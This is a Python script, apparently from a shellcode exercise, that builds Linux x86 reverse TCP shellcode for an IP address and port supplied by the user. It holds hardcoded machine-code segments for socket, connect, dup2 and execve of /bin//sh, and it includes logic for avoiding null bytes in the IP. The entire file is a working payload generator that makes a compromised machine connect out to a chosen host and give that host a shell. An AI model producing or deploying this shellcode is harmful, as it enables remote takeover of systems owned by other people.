#!/usr/bin/python

import sys
import re
import binascii
import socket
import struct

start_segment = (
'\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01'+
'\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc0\\x31\\xf6\\xb0\\x66'+
'\\x80\\xc3\\x02\\x56\\x56'
)
mov_instr='\\xbe\\xff\\xff\\xff\\xff'
sub_instr='\\x81\\xee'
#\xfe\xff\xff\x80 - this is where the computed value for ip address subtraction should be, reversed
bswap_instr='\\x0f\\xce\\x56'
pushw_instr='\\x66\\x68'
#\x7a\xdd - this is where the port value should be

end_segment = (
'\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\x89'+
'\\xd3\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9'+
'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89'+
'\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80'
)


# Check proper arguments passesd at command line
if len(sys.argv) != 3 or sys.argv[1].find('.')==-1:
	print "Reverse tcp connect - Shellcode create script for user supplied"
	print "IP address and port."
	print "usage: shcreateA2.py [ip_address] [port]"
	print ""
	sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]
sep='\\x'
movesi_instr='\\xbe'		# will be used if address is zero free
hexip=binascii.hexlify(socket.inet_aton(ip))


# Use a regex to search for an address containing zeros
# \.0		match dot zero
match = re.search(r'\.0', ip)

if match:
	print "[*] Supplied ip address contains zero..."
	#subtract address from 0xFFFFFFF
	s=4294967295 - int(hexip, 16)	
	print "Subtracting from 0xFFFFFFFF:", hex(s)
	#make it a string, store only numbers
	k=hex(s)[2:10]
	print "String extract:", k
	# reverse byte order
	revk=binascii.hexlify(struct.pack('<L', int(k,16)))
	#insert \x seperators
	srevk=sep+revk[0:2]+sep+revk[2:4]+sep+revk[4:6]+sep+revk[6:8]
	print "      reversed:",revk
	# put pieces together
	IP_SEGMENT= mov_instr+sub_instr+srevk+bswap_instr
	#print "Shellcode segment for this IP is:\n", IP_SEGMENT

else:
	#no zeroes in supplied ip address
	#reverse byte order
	reversedhexip=binascii.hexlify(struct.pack('<L', int(hexip,16)))
	#insert \x seperators
	srevip=sep+reversedhexip[0:2]+sep+reversedhexip[2:4]+sep+reversedhexip[4:6]+sep+reversedhexip[6:8]
	#put pieces together
	IP_SEGMENT=movesi_instr+srevip+bswap_instr
	#print "Shellcode segment for this IP is:\n", IP_SEGMENT


#Compute shellcode for supplied port number
port_str="{0:0{1}x}".format(int(port),4)
sport_str=sep+port_str[0:2]+sep+port_str[2:4]
PORT_SEGMENT=pushw_instr+sport_str
#print "Port string:", PORT_SEGMENT

#put all pieces together
shellcode=start_segment+IP_SEGMENT+PORT_SEGMENT+end_segment

print "[*] Shellcode length:",len(shellcode)/4
print shellcode

print "-------------------\n"
reversedhexip=binascii.hexlify(struct.pack('<L', int(hexip,16)))
#print "Hex ip address",hexip
#print "Reversed:", reversedhexip


print "IP addres:", ip, "   Hex conv.:",hexip, "   Reversed Hex:",reversedhexip
print "Port:",port,"   Hex port:",port_str


